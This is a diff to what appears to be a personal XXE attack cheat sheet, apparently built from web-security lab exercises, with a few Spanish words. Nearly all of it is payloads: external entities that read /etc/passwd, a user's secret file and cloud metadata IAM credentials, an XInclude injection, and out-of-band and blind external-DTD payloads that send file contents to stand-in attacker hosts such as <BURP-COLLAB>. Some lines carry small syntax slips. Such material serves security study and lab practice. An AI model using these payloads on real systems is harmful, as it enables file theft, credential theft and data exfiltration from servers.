@@ -34,15 +34,26 @@
 <!DOCTYPE foo [ <!ENTITY xxe; SYSTEM "file:///home/carlos/secret" > ]>  
 <!DOCTYPE foo [ <!ENTITY xxe; SYSTEM "https://example.com/archivo.txt" > ]>
 <!DOCTYPE foo [ <!ENTITY xxe; SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin" > ]> 
-<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://<BURP-COLLAB>"> ]> 
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://<BURP-COLLAB>"> %xxe; ]>
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd" > %xxe; ]> 
 
 productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1 
 ```
 
+#### XXE-OOB internal entity (external entities not allowed)
+
+```bash
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://<BURP-COLLAB>"> ]>
+
+<storeId>
+&xxe;
+</storeId>
+```
+
+
 #### BLIND-XXE-EXTERNAL-DTD
 ```bash
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://<EXPLOIT-SV>/"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://<EXPLOIT-SV>/exploit"> %xxe;]>
 
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<BURP-COLLAB/?content=%file;'>"> # &#x25 = % in hexadecimal so it is treated as text
